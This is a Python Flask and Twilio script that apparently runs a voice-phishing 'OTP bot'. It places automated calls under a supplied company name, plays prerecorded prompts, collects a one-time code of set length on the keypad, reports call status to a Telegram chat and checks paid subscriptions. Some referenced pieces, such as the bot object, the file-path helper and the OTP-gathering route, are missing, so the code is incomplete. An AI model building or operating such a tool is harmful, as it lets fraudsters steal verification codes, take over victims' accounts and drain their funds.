import os
import json
import requests
from datetime import datetime, timedelta
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from flask import Flask, request, jsonify

# Load configuration from settings.json
with open('./conf/settings.txt', 'r') as f:
    raw_config = json.load(f)

# Correct way to get the bot token from settings.txt
bot_token = raw_config.get('bot_token', '')
account_sid = raw_config.get('account_sid', '')
auth_token = raw_config.get('auth_token', '')
render_url = raw_config.get('render_url', 'https://glitcha.onrender.com')  # Use the actual Render URL here
phone_numz = raw_config.get('phone_numz', '')

# Define admin user ID
admin_id = 6397626287  # Set admin ID

# Initialize client and bot
client = Client(account_sid, auth_token)
app = Flask(__name__)

# Helper function to check subscription status
def check_subscription(idkey):
    subscription_path = f'./conf/{idkey}/subs.txt'
    
    if os.path.exists(subscription_path):
        with open(subscription_path, 'r') as f:
            subscription = f.read().strip()
        
        try:
            # Parse subscription expiry date
            expiry_date = datetime.strptime(subscription, '%d/%m/%Y')
            return "ACTIVE" if expiry_date >= datetime.now() else "EXPIRED"
        except ValueError:
            return "EXPIRED"
    
    return "EXPIRED"

@app.route("/voice", methods=["POST"])
def voice():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)

    answered_by = request.values.get("AnsweredBy", "")
    resp = VoiceResponse()

    if answered_by.startswith("machine_end"):
        send_telegram_message(chat_id, "Call Status : Voice Mail")
        resp.say("We'll call you back, thanks")
        resp.hangup()
        return str(resp)

    gather = Gather(num_digits=1, action=f"/gather?chat_id={chat_id}&user_id={user_id}", timeout=120)
    gather.pause(length=1)
    gather.play(get_file_path(user_id, "checkifhuman.mp3"))
    resp.append(gather)
    return str(resp)

@app.route("/gather", methods=["POST"])
def gather():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)

    resp = VoiceResponse()

    if "Digits" in request.values:
        choice = request.values["Digits"]
        if choice == "1":
            resp.play(get_file_path(user_id, "explain.mp3"))
            resp.pause(length=2)
            num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
            gatherotp = Gather(num_digits=num_digits, action=f"/gatherotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
            gatherotp.play(get_file_path(user_id, "askdigits.mp3"))
            resp.append(gatherotp)
        else:
            resp.play(get_file_path("sounds", "errorpick.mp3"))
            resp.redirect(f"/voice?chat_id={chat_id}&user_id={user_id}")
    else:
        resp.redirect("/voice")

    return str(resp)

@app.route("/call", methods=["POST"])
def custom_call_handler():
    try:
        phonenum = request.form.get("phonenum")
        name = request.form.get("name")
        digits = request.form.get("digits")
        companyz = request.form.get("company")

        # Validate phone number format: starts with '+1' and contains 10 digits
        if not phonenum.startswith('+1') or len(phonenum) != 12 or not phonenum[2:].isdigit():
            return jsonify({"error": "Invalid phone number format! Please enter a number in the format +1xxxxxxxxxx."})

        open(f'./conf/{request.form["user_id"]}/Digits.txt', 'w').write(digits)
        open(f'./conf/{request.form["user_id"]}/Name.txt', 'w').write(name)
        open(f'./conf/{request.form["user_id"]}/Company Name.txt', 'w').write(companyz)

        bot.send_message(
            request.form["chat_id"],
            f"🟣 Initiating a Call...\n\n👤 Name: {name}\n📞 Phone: {phonenum}\n🔑 Code: {digits}\n🏢 Company: {companyz}"
        )

        # Initiate a call using Twilio
        call = client.calls.create(
            to=phonenum,
            from_=phone_numz,
            url=f'{render_url}/voice?chat_id={request.form["chat_id"]}&user_id={request.form["user_id"]}'  # Use the Render URL for webhook
        )
        return jsonify({"message": f"📞 Call initiated successfully! Call SID: {call.sid}"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/twilio_webhook", methods=["POST"])
def twilio_webhook():
    """Handle incoming call status changes."""
    call_sid = request.form.get('CallSid')
    status = request.form.get('CallStatus')
    # You can log this or handle it as needed
    print(f"Call SID: {call_sid}, Status: {status}")
    return "", 200

def send_telegram_message(chat_id, text):
    """Helper to send message to Telegram."""
    TELEGRAM_API_BASE = f"https://api.telegram.org/bot{bot_token}"
    url = f"{TELEGRAM_API_BASE}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    response = requests.get(url, params=payload)
    return response.status_code == 200

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
